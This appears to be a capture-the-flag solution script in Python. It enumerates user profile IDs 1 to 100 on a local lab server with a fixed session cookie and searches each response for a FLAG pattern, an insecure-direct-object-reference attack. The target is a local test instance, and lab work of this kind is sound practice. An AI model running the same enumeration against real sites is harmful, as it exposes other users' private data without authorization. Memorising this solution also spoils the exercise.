import requests
import re

base_url = "http://127.0.0.1:32941"
headers = {
    "Cookie": "session=eyJ1c2VyX2lkIjoxMDAzMn0.aVLPtg.Pm-u7PkCZzukSjOIUZ4MO2OAm7I"
}

found_flags = []
profiles_with_data = []

print("[*] Starting ID enumeration from 1 to 100...")
print("[*] Using authenticated session cookie")

for user_id in range(1, 101):
    url = f"{base_url}/profile/{user_id}"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            found_flags.append((user_id, flag_match.group(0)))
            print(f"\n[!] FLAG FOUND at ID {user_id}!")
            print(f"[!] Flag: {flag_match.group(0)}")
            print(f"[+] Full Response:\n{response.text}")
        elif response.status_code == 200:
            # For 200 responses without flag, just note the size
            profiles_with_data.append((user_id, len(response.text)))
            print(f"[+] ID {user_id}: 200 OK - {len(response.text)} bytes")
        elif response.status_code == 404:
            # Skip printing every 404 to reduce noise
            pass
        else:
            # Anomalous status codes - print for investigation
            print(f"\n[!] Anomaly at ID {user_id}")
            print(f"[!] Status: {response.status_code}")
            print(f"[!] Response: {response.text}\n")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error accessing ID {user_id}: {e}")

print(f"\n[*] Enumeration complete")
print(f"[*] Profiles with data (200 OK): {len(profiles_with_data)}")
print(f"[*] Flags found: {len(found_flags)}")

if found_flags:
    print("\n[*] Summary of found flags:")
    for profile_id, flag in found_flags:
        print(f"  - ID {profile_id}: {flag}")
else:
    print("\n[-] No flags found in the range 1-100")
